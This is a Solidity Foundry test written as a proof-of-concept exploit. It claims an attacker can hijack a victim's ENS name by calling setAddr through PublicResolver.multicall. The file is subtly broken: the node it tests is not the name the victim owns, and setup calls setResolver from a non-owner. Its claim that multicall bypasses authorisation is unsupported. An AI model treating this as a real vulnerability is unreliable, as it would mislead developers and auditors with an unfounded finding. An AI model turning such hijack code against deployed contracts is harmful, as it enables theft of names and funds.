// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../contracts/PublicResolver.sol";
import "../contracts/ENSRegistry.sol";

contract POC_Path09_ProtocolLevelTrustDestruction is Test {
    ENS public ens;
    PublicResolver public resolver;

    address public attacker = address(0x1337);
    address public victim = address(0xdead);
    bytes32 public testNode = keccak256(abi.encodePacked(bytes32(0), keccak256("test")));

    function setUp() public {
        // Deploy contracts
        ens = new ENS();
        ens.setOwner(bytes32(0), address(this));

        resolver = new PublicResolver(
            ens,
            INameWrapper(address(0)),
            address(this),
            address(this)
        );

        // Setup test domain
        ens.setSubnodeOwner(bytes32(0), keccak256("eth"), address(this));
        ens.setSubnodeOwner(keccak256(abi.encodePacked(bytes32(0), keccak256("eth"))), keccak256("test"), victim);
        ens.setResolver(testNode, address(resolver));

        // Victim sets up their records
        vm.prank(victim);
        resolver.setAddr(testNode, victim);
    }

    function test_Path09_ProtocolLevelTrustDestruction() public {
        // Demonstrate resolution hijacking
        assertEq(resolver.addr(testNode), victim);

        bytes[] memory hijackCalls = new bytes[](1);
        hijackCalls[0] = abi.encodeCall(resolver.setAddr, (testNode, attacker));

        vm.prank(attacker);
        resolver.multicall(hijackCalls);

        // Verify domain hijacking - trust model destroyed
        assertEq(resolver.addr(testNode), attacker);
        assertNotEq(resolver.addr(testNode), victim);
    }
}